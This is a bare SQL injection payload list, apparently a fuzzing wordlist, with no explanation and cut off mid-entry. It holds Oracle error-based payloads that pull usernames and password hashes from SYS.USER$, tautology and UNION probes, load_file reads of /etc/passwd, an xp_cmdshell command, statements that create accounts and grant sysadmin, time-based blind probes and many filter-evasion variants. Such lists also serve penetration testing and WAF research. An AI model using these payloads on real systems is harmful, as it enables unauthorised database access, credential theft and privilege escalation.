1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND \\'i\\'=\\'i  \\' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND \\'i\\'=\\'i  \\'||(elt(-3+5,bin(15),ord(10),hex(char(45))))  ||6  \\'||\\'6  (||6)  \\' or 1=1--   or 1=1  \\' or \\'1\\'=\\'1  ; or \\'1\\'=\\'1\\'  \" or isNULL(1/0) /*  \\' or \\'7659\\'=\\'7659  \" or isNULL(1/0) /*  \\' --   \\' or 1=1--  \" or 1=1--  \\' or 1=1 /*  or 1=1--  \\' or \\'a\\'=\\'a  \" or \"a\"=\"a  \\') or (\\'a\\'=\\'a  admin\\' or \\'  \\' select * from information_schema.tables--  ) union select * from information_schema.tables;  \\' having 1=1--  \\' having 1=1--  \\' group by userid having 1=1--  \\' select name from syscolumns where id = (select id from sysobjects where name = tablename\\')--  \\' or 1 in (select @@version)--  \\' union all select @@version--  \\' or \\'unusual\\' = \\'unusual\\'  \\' or \\'something\\' = \\'some\\'+\\'thing\\'  \\' or \\'text\\' = n\\'text\\'  \\' or \\'something\\' like \\'some%\\'  \\' or 2 > 1  \\' or \\'text\\' > \\'t\\'  \\' or \\'whatever\\' in (\\'whatever\\')  \\' or 2 between 1 and 3  \\' or username like char(37);  \\' union select * from users where login = char(114,111,111,116);  \\' union select   password:*/=1--  uni/**/on sel/**/ect  \\'; execute immediate \\'sel\\' || \\'ect us\\' || \\'er\\'  \\'; exec (\\'sel\\' + \\'ect us\\' + \\'er\\')  \\'/**/or/**/1/**/=/**/1  \\' or 1/*   or isNULL(1/0) /*  \\' or \\'7659\\'=\\'7659  \" or isNULL(1/0) /*  \\' -- &password=  \\'; begin declare @var varchar(8000) set @var=\\':\\' select @var=@var+\\'+login+\\'/\\'+password+\\' \\' from users where login >   @var select @var as var into temp end --  \\' and 1 in (select var from temp)--  \\' union select 1,load_file(\\'/etc/passwd\\'),1,1,1;  1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;  \\' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));  \\'; exec master..xp_cmdshell \\'ping 10.10.1.2\\'--  create user name identified by \\'pass123\\'  create user name identified by pass123 temporary tablespace temp default tablespace users;   \\' ; drop table temp --  exec sp_addlogin \\'name\\' , \\'password\\'  exec sp_addsrvrolemember \\'name\\' , \\'sysadmin\\'  insert into mysql.user (user, host, password) values (\\'name\\', \\'localhost\\', password(\\'pass123\\'))  grant connect to name; grant resource to name;  insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)  \\' or 1=1 --  \\' union (select @@version) --  \\' union (select NULL, (select @@version)) --  \\' union (select NULL, NULL, (select @@version)) --  \\' union (select NULL, NULL, NULL,  (select @@version)) --  \\' union (select NULL, NULL, NULL, NULL,  (select @@version)) --  \\' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --  \\'; if not(substring((select @@version),25,1) <> 0) waitfor delay \\'0:0:2\\' --  \\'; if not(substring((select @@version),25,1) <> 5) waitfor delay \\'0:0:2\\' --  \\'; if not(substring((select @@version),25,1) <> 8) waitfor delay \\'0:0:2\\' --  \\'; if not(substring((select @@version),24,1) <> 1) waitfor delay \\'0:0:2\\' --  \\'; if not(select system_user) <> \\'sa\\' waitfor delay \\'0:0:2\\' --  \\'; if is_srvrolemember(\\'sysadmin\\') > 0 waitfor delay \\'0:0:2\\' --   \\'; if not((select serverproperty(\\'isintegratedsecurityonly\\')) <> 1) waitfor delay \\'0:0:2\\' --  \\'; if not((select serverproperty(\\'isintegratedsecurityonly\\')) <> 0) waitfor delay \\'0:0:2\\' --  select * from users where id=1 or (\\\\)=1 union select 1,@@VERSION -- 1   select * from users where id=1 or (\\\\.)=1 union select 1,@@VERSION -- 1   select * from users where id=1 or (\\\\+)=1 or 1=1 -- 1   select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1   select * from users where id=1 or (\\\\+)=1 union select 1,@@VERSION -- 1   select * from users where id=1 or ($+)=1 or 1=1 -- 1   select * from users where id=1 or ($+)=1 union select 1,@@VERSION -- 1   select * from users where id=1 or \\\\.<\\\\ or 1=1 -- 1   select * from users where id=1 or \\\\.<1 or 1=1 -- 1   select * from users where id=1 or \\\\.<1 union select 1,@@VERSION -- 1   select * from users where id=1 or \\\\.<\\\\ union select 1,@@VERSION -- 1   select * from users where id=1 or \\\\.<$ or 1=1 -- 1   select * from users where id=1 or \\\\.<$ union select 1,@@VERSION -- 1   select * from users where id=1 or \\\\.< =1 union select 1,@@VERSION -- 1   select * from users where id=1 ||1 union select 1,banner from v$version where rownum=1 -- 1   select * from users where id=1 ||1 union select null,banner from v$version where rownum=1 -- 1   select * from users where id=1   or 1=1 -- 1   select * from users where id=1 or \\\\+<\\\\ or 1=1 -- 1   select * from users where id=1 or  1<@=1 union select 1,version() -- 1   select * from users where id=1 or \\\\+<\\\\ union select 1,@@VERSION -- 1   select * from users where id=1 or \\\\+<$ union select 1,@@VERSION -- 1   select * from users where id=1 or 1&@#=1 union select 1,version() -- 1   select * from users where id=1 or $ .=1 union select 1,@@VERSION -- 1   select * from users where id=1 or $ 1=1 or 1=1 -- 1   select * from users where id=1 or $ 1=1 union select 1,@@VERSION -- 1   select * from users where id=1 or $<\\\\ or 1=1 -- 1   select * from users where id=1 or $<\\\\. or 1=1 -- 1   select * from users where id=1 or $<\\\\. union select 1,@@VERSION -- 1   select * from users where id=1 or $<\\\\ union select 1,@@VERSION -- 1   select * from users where id=1 or $+<\\\\ or 1=1 -- 1   select * from users where id=1 or $+<1 union select 1,@@VERSION -- 1   select * from users where id=1 or $+<\\\\ union select 1,@@VERSION -- 1   select * from users where id=1 or $+<$ union select 1,@@VERSION -- 1   select * from users where id=1 or \\\\<\\\\. or 1=1 -- 1   select * from users where id=1 or \\\\<\\\\. union select 1,@@VERSION -- 1   select * from users where id=1 or \\\\<1 or 1=1 -- 1   select * from users where id=1 or \\\\<1 union select 1,@@VERSION -- 1   select * from users where id=1 or \\\\<\\\\ union select 1,@@VERSION -- 1   select * from users where id=1 or \\\\<\\\\ union select null,@@VERSION -- 1   select * from users where id=1 or \\\\<$ or 1=1 -- 1   select * from users where id=1 or \\\\<$ union select 1,@@VERSION -- 1   select * from users where id=1 or \\\\< =1 or 1=1 -- 1   select * from users where id=1 or \\\\< =1 union select 1,@@VERSION -- 1   select * from users where id=1 or !<@ or 1=1 -- 1   select * from users where id=1 or !<@ union select 1,version() -- 1   select * from users where id=1 or @`\\\\` union select 1,version() -- 1   select * from users where id=1 or  @$#=1 union select 1,version() -- 1   select * from users where id=1 or @<@=1 union select 1,version() -- 1   select * from users where id=1 +(\\\\) or 1=1 -- 1   select * from users where id=1 +(\\\\) union select null,@@VERSION -- 1   select * from users where id=1.&&1 union select 1,version() -- 1   select * from users where id=1. or 1=1 -- 1   select * from users where id=1.&&@ union select 1,version() -- 1   select * from users where id=1 + (\\\\.) or 1=1 -- 1   select * from users where id=1 + (\\\\.) union select null,@@VERSION -- 1   select * from users where id=1.  union select 1,version() -- 1   select * from users where id=1. union select 1,banner from v$version where rownum=1 -- 1   select * from users where id=1.  union select version(),version() -- 1   select * from users where id=1. union select null,version() -- 1   select * from users where id=1 +\\\\. union select null,@@VERSION -- 1   select * from users where id=1. union select null,banner from v$version where rownum=1 -- 1   select * from users where id=1. <@ or 1=1 -- 1   select * from users where id=1.<@. or 1=1 -- 1   select * from users where id=1.<@. union select 1,version() -- 1   select * from users where id=1.*1 or 1=1 -- 1   select * from users where id=1.*1 union select 1,banner from v$version where rownum=1 -- 1   select * from users where id=1.<1# union select 1,version() -- 1   select * from users where id=1. <@ union select 1,version() -- 1   select * from users where id=1. <@ union select version(),version() -- 1   select * from users where id=1.*\\\\ union select null,@@VERSION -- 1   select * from users where id=1.<@$ or 1=1 -- 1   select * from users where id=1.<@$ union select 1,version() -- 1   select * from users where id=1.%@ or 1=1 -- 1   select * from users where id=1.%@ union select 1,version() -- 1   select * from users where id=11||1 union select 1,banner from v$version where rownum=1 -- 1   select * from users where id=1 +1 or 1=1 -- 1   select * from users where id=1 +(1) or 1=1 -- 1   select * from users where id=1 +(1) union select 1,banner from v$version where rownum=1 -- 1   select * from users where id=1 +(1) union select null,banner from v$version where rownum=1 -- 1   select * from users where id=1 +1 union select 1,banner from v$version where rownum=1 -- 1   select * from users where id=1 +1 union select null,banner from v$version where rownum=1 -- 1   select * from users where id=11<1# union select 1,version() -- 1   select * from users where id=1 + (\\\\+) or 1=1 -- 1   select * from users where id=1 + (\\\\+) union select null,@@VERSION -- 1   select * from users where id=1 +\\\\+. union select null,@@VERSION -- 1   select * from users where id=1 -1<@ union select 1,version() -- 1   select * from users where id=1 +1<@ union select version(),version() -- 1   select * from users where id=1 +1<@ union select null,version() -- 1   select * from users where id=1 + \\\\+%\\\\ or 1=1 -- 1   select * from users where id=1 + \\\\+%1 or 1=1 -- 1   select * from users where id=1 + \\\\+%1 union select null,@@VERSION -- 1   select * from users where id=1 + \\\\+*\\\\ union select null,@@VERSION -- 1   select * from users where id=1 + \\\\+%$ or 1=1 -- 1   select * from users where id=1 + \\\\+*$ union select null,@@VERSION -- 1   select * from users where id=1 union select (1),banner from v$version where rownum=1 -- 1   select * from users where id=1 union select 1||1,version() -- 1   select * from users where id=1 union select 1||@,version() -- 1   select * from users where id=1 union select 1 1$,version() -- 1   select * from users where id=1 union select 1 $,version() -- 1   select * from users where id=1 union select 1 1a,version() -- 1   select * from users where id=1 union select 1<@$,version() -- 1   select * from users where id=1 union select 1,banner from v$version where rownum=1 -- 1   select * from users where id=1 union select .1_,version() -- 1   select * from users where id=1 union select 1`\\\\`,version() -- 1   select * from users where id=1 union select 1a#,banner from v$version where rownum=1 -- 1   select * from users where id=1 union select 1a,banner from v$version where rownum=1 -- 1   select * from users where id=1 union select .1$_,version() -- 1   select * from users where id=1 union select 1<@,version() -- 1   select * from users where id=1 union select 1<@.,version() -- 1   select * from users where id=1 union select 1 $$,version() -- 1   select * from users where id=1 union select !<1,version() -- 1   select * from users where id=1 union select +!<1,version() -- 1   select * from users where id=1 union select +!<@,version() -- 1   select * from users where id=1 union select !<@,version() -- 1   select * from users where id=1 union select @||1,version() -- 1   select * from users where id=1 union select @&&@,version() -- 1   select * from users where id=1 union select @ 1$,version() -- 1   select * from users where id=1 union select  @ $,version() -- 1   select * from users where id=1 union select @ 1a,version() -- 1   select * from users where id=1 union select @<@$,version() -- 1   select * from users where id=1   union select null,banner from v$version where rownum=1 -- 1   select * from users where id=1 union select @ _,version() -- 1   select * from users where id=1 union select @ $_,version() -- 1   select * from users where id=1 union select @<@,version() -- 1   select * from users where id=1 union select @<@.,version() -- 1   select * from users where id=1 union select @ $$,version() -- 1   select * from users where id=1 +$ . or 1=1 -- 1   select * from users where id=1 +$ . union select null,@@VERSION -- 1   select * from users where id=1 +$ 1 or 1=1 -- 1   select * from users where id=1 +$ 1 union select null,@@VERSION -- 1   select * from users where id=1 +$+ or 1=1 -- 1   select * from users where id=1 + ($+) or 1=1 -- 1   select * from users where id=1 + ($+) union select null,@@VERSION -- 1   select * from users where id=1 +$+. or 1=1 -- 1   select * from users where id=1 +$+. union select null,@@VERSION -- 1   select * from users where id=1 +$+ union select null,@@VERSION -- 1   select * from users where id=1 + $+%\\\\ or 1=1 -- 1   select * from users where id=1 + $+%1 or 1=1 -- 1   select * from users where id=1 + $+%1 union select null,@@VERSION -- 1   select * from users where id=1 + $+*\\\\ union select null,@@VERSION -- 1   select * from users where id=1 + $+%$ or 1=1 -- 1   select * from users where id=1 + $+*$ union select null,@@VERSION -- 1   select * from users where id=1 <@ or 1=1 -- 1   select * from users where id=1 %(\\\\) or 1=1 -- 1   select * from users where id=1 *(\\\\) union select null,@@VERSION -- 1   select * from users where id=1 %(1) or 1=1 -- 1   select * from users where id=1 *(1) union select 1,banner from v$version where rownum=1 -- 1   select * from users where id=1 %($) or 1=1 -- 1   select * from users where id=1 %(@) or 1=1 -- 1   select * from users where id=1 <@. or 1=1 -- 1   select * from users where id=1 <@.. or 1=1 -- 1   select * from users where id=1<@.. union select 1,version() -- 1   select * from users where id=1 <@. union select 1,version() -- 1   select * from users where id=1  <@. union select version(),version() -- 1   select * from users where id=1 *\\\\. union select null,@@VERSION -- 1   select * from users where id=1 <@.$ or 1=1 -- 1   select * from users where id=1 <@.$ union select 1,version() -- 1   select * from users where id=1 *1 or 1=1 -- 1   select * from users where id=1 *1 union select 1,banner from v$version where rownum=1 -- 1   select * from users where id=1 *1 union select null,banner from v$version where rownum=1 -- 1   select * from users where id=1 <1## union select 1,version() -- 1   select * from users where id=1 <@1$ or 1=1 -- 1   select * from users where id=1 <@1$ union select 1,version() -- 1   select * from users where id=1 *\\\\ union select null,@@VERSION -- 1   select * from users where id=1 <@$ or 1=1 -- 1   select * from users where id=1 %$ . or 1=1 -- 1   select * from users where id=1 *$ . union select null,@@VERSION -- 1   select * from users where id=1 %$ 1 or 1=1 -- 1   select * from users where id=1 %$ 1 union select null,@@VERSION -- 1   select * from users where id=1 <@$_ or 1=1 -- 1   select * from users where id=1 <@$_ union select 1,version() -- 1   select * from users where id=1 <@<@ or 1=1 -- 1   select * from users where id=1 %!<1 or 1=1 -- 1   select * from users where id=1 | |1 union select 1,banner from v$version where rownum=1 -- 1   select * from users where id=1<@<@ union select 1,version() -- 1   select * from users where id=1 <@<@ union select version(),version() -- 1   select * from users where id=1 <@<@ union select null,version() -- 1   select * from users where id=1 %!<@ or 1=1 -- 1   select * from users where id=1 <@&@ union select 1,version() -- 1   select * from users where id=1 <@$$ union select 1,version() -- 1   select * from users where id=1 &@ or 1=1 -- 1   select * from users where id=\\'1\\' or ||/1=1 union select 1,version() -- 1\\'   select * from users where id=\\'1\\' or (\\\\)=1 union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or (\\\\.)=1 union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or (1)=1 union select 1,banner from v$version where rownum=1 -- 1\\'   select * from users where id=\\'1\\' or \\\\.<\\\\ or 1=1 -- 1\\'   select * from users where id=\\'1\\' or \\\\.<1 union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or \\\\.<\\\\ union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or \\\\.<$ union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or \\\\.< =1 union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' ||1 union select 1,banner from v$version where rownum=1 -- 1\\'   select * from users where id=\\'1\\'   or 1=1 -- 1\\'   select * from users where id=\\'1\\' or 1^=1 union select 1,banner from v$version where rownum=1 -- 1\\'   select * from users where id=\\'1\\' or $ .=1 union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or $ 1=1 or 1=1 -- 1\\'   select * from users where id=\\'1\\' or $ 1=1 union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or $<\\\\ or 1=1 -- 1\\'   select * from users where id=\\'1\\' or $<\\\\. union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or $<\\\\ union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or $+<$ union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or \\\\<\\\\. or 1=1 -- 1\\'   select * from users where id=\\'1\\' or \\\\<\\\\. union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or \\\\<1 or 1=1 -- 1\\'   select * from users where id=\\'1\\' or !<1 union select 1,version() -- 1\\'   select * from users where id=\\'1\\' or \\\\<\\\\ union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or \\\\<$ or 1=1 -- 1\\'   select * from users where id=\\'1\\' or \\\\<$ union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or \\\\< =1 union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' or !<@ or 1=1 -- 1\\'   select * from users where id=\\'1\\' or !<@ union select 1,version() -- 1\\'   select * from users where id=\\'1\\' or @(1)=1 union select 1,version() -- 1\\'   select * from users where id=\\'1\\' or @ 1=1 union select 1,version() -- 1\\'   select * from users where id=\\'1\\' or @ @1=1 union select 1,version() -- 1\\'   select * from users where id=1 or \"()\" or 1=1 -- 1   select * from users where id=1 or \"(,\"=1 or 1=1 -- 1   select * from users where id=1 or \"(.\" or 1=1 -- 1   select * from users where id=1 or \"(1\" or 1=1 -- 1  s  select * from users where id=1 or \"(;\" or 1=1 -- 1   select * from users where id=1 or \"(]\" or 1=1 -- 1   select * from users where id=1 or 1#\"( union select 1,version() -- 1   select * from users where id=1 or 1#\"( union select version(),version() -- 1   select * from users where id=1 or 1#\"( union select \\'a\\',version() -- 1   select * from users where id=1 or 1#\"( union select null,version() -- 1   select * from users where id=1 or \"(#\" or 1=1 -- 1   select * from users where id=1 or \"([\" or 1=1 -- 1   select * from users where id=1 or \"(_\" or 1=1 -- 1   select * from users where id=1 or @#\"(=1 or 1=1 -- 1   select * from users where id=1 or @#\"(=1 union select 1,version() -- 1   select * from users where id=1 or \"(&\" or 1=1 -- 1   select * from users where id=1 or \"(@\" or 1=1 -- 1   select * from users where id=1 or \"({\" or 1=1 -- 1   select * from users where id=1 or \")(\"=1 or 1=1 -- 1   select * from users where id=1 or \"),\" or 1=1 -- 1   select * from users where id=1 or \").\"=1 or 1=1 -- 1   select * from users where id=1 or \")1\" or 1=1 -- 1  s  select * from users where id=1 or \");\" or 1=1 -- 1   select * from users where id=1 or \")]\" or 1=1 -- 1   select * from users where id=1 or \")[\" or 1=1 -- 1   select * from users where id=1 or \")$\" or 1=1 -- 1   select * from users where id=1 or \")@\" or 1=1 -- 1   select * from users where id=1 or \"){\" or 1=1 -- 1   select * from users where id=1 or \",(\" or 1=1 -- 1   select * from users where id=1 or \",)\"=1 or 1=1 -- 1   select * from users where id=1 or \",,\"=1 or 1=1 -- 1   select * from users where id=1 or \",.\" or 1=1 -- 1  s  select * from users where id=1 or \",;\" or 1=1 -- 1   select * from users where id=1 or \",?\" or 1=1 -- 1   select * from users where id=1 or 1#\", union select 1,version() -- 1   select * from users where id=1 or 1#\", union select version(),version() -- 1   select * from users where id=1 or 1#\", union select \\'a\\',version() -- 1   select * from users where id=1 or 1#\", union select null,version() -- 1   select * from users where id=1 or \",#\" or 1=1 -- 1   select * from users where id=1 or 1#\",=1 or 1=1 -- 1   select * from users where id=1 or @#\",=1 union select 1,version() -- 1   select * from users where id=1 or \",&\" or 1=1 -- 1   select * from users where id=1 or \",{\" or 1=1 -- 1   select * from users where id=1 or \".(\" or 1=1 -- 1   select * from users where id=1 or \".)\" or 1=1 -- 1   select * from users where id=1 or \".,\" or 1=1 -- 1   select * from users where id=1 or \"..\"=1 or 1=1 -- 1  s  select * from users where id=1 or \".;\" or 1=1 -- 1   select * from users where id=1 or \".]\" or 1=1 -- 1   select * from users where id=1 or 1#\". union select 1,version() -- 1   select * from users where id=1 or 1#\". union select version(),version() -- 1   select * from users where id=1 or 1#\". union select \\'a\\',version() -- 1   select * from users where id=1 or 1#\". union select null,version() -- 1   select * from users where id=1 or \".#\" or 1=1 -- 1   select * from users where id=1 or \".[\" or 1=1 -- 1   select * from users where id=1 or \"._\" or 1=1 -- 1   select * from users where id=1 or @#\".=1 or 1=1 -- 1   select * from users where id=1 or 1#\".=1 union select 1,version() -- 1   select * from users where id=1 or \".%\" or 1=1 -- 1   select * from users where id=1 or \".@\" or 1=1 -- 1   select * from users where id=1 or \".{\" or 1=1 -- 1   select * from users where id=1 or \"1(\"=1 or 1=1 -- 1   select * from users where id=1 or \"1)\" or 1=1 -- 1   select * from users where id=1 or \"1,\" or 1=1 -- 1  s  select * from users where id=1 or \"1;\"=1 or 1=1 -- 1   select * from users where id=1 or \"1]\" or 1=1 -- 1   select * from users where id=1 or 1#\"1 union select 1,version() -- 1   select * from users where id=1 or 1#\"1 union select version(),version() -- 1   select * from users where id=1 or 1#\"1 union select \\'a\\',version() -- 1   select * from users where id=1 or 1#\"1 union select null,version() -- 1   select * from users where id=1 or \"1#\" or 1=1 -- 1   select * from users where id=1 or \"1[\" or 1=1 -- 1   select * from users where id=1 or \"1_\" or 1=1 -- 1   select * from users where id=1 or \"1&\" or 1=1 -- 1   select * from users where id=1 or \"1{\" or 1=1 -- 1   select * from users where id=\\'1\\' or \"\"<@ union select 1,version() -- 1\\'  &1c (s )s ,s .s 1s ;s ?s UE1 UEf UEs UEv c n ns os s v {s  select * from users where id=1 or 1#\"; or 1=1 -- 1   select * from users where id=1 or \";(\" or 1=1 -- 1   select * from users where id=1 or \";)\"=1 or 1=1 -- 1   select * from users where id=1 or \";,\"=1 or 1=1 -- 1   select * from users where id=1 or \";.\"=1 or 1=1 -- 1   select * from users where id=1 or \";1\" or 1=1 -- 1  s  select * from users where id=1 or \";]\" or 1=1 -- 1   select * from users where id=1 or 1#\"; union select 1,version() -- 1   select * from users where id=1 or 1#\"; union select version(),version() -- 1   select * from users where id=1 or 1#\"; union select \\'a\\',version() -- 1   select * from users where id=1 or 1#\"; union select null,version() -- 1   select * from users where id=1 or \";#\" or 1=1 -- 1   select * from users where id=1 or \";[\" or 1=1 -- 1   select * from users where id=1 or \";_\" or 1=1 -- 1   select * from users where id=1 or @#\";=1 or 1=1 -- 1   select * from users where id=1 or 1#\";=1 union select 1,version() -- 1   select * from users where id=1 or 